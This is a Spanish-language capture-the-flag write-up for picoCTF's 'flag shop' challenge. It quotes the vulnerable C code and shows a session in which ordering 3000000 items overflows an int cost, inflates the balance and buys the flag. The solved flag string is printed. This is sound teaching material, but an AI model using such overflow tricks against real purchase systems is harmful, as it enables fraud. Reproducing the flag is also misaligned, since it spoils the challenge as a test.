## Descripción
There's a flag shop selling stuff, can you buy a flag? [Source](https://jupiter.challenges.picoctf.org/static/dd28f0987f28c894f35d5d48564c3402/store.c). Connect with `nc jupiter.challenges.picoctf.org 44566`.
## Solución
Al ver el código vemos que está el caso de que hayamos elegido la opción 2 en el menú principal del programa y  si tenemos un saldo mayor a 100000 nos van a dar el contenido de un archivo llamado "flag.txt".
```c
else if(auction_choice == 2){
	printf("1337 flags cost 100000 dollars, and we only have 1 in stock\n");
	printf("Enter 1 to buy one");
	int bid = 0;
	fflush(stdin);
	scanf("%d", &bid);
	
	if(bid == 1){
		
		if(account_balance > 100000){
			FILE *f = fopen("flag.txt", "r");
```
Para esto podemos hacer que la variable se desborde dándole un número que no pueda almacenar debido al tipo de variable que es (int). Si ejecutamos el programa y le damos a que queremos 3000000 banderas la variable se desborda y ahora podemos acceder a la bandera.
```shell
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
3000000

The final cost is: -1594967296

Your current balance after transaction: 1594968396

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: picoCTF{m0n3y_bag5_68d16363}
Welcome to the flag exchange
We sell flags

3. Check Account Balance

4. Buy Flags

5. Exit

 Enter a menu selection
```
## Notas adicionales
Si por ejemplo colocamos en una variable de tipo int el número 99999999999999999999999999999, el compilador puede que marque error pero si le damos 3000000000 la variable se desborda y se va a -1294967296. Esto también depende del compilador que se esté usando, en el caso de este reto se necesitó el número 3000000.
## Referencias
- https://www.quora.com/How-do-I-run-a-c-file-in-a-terminal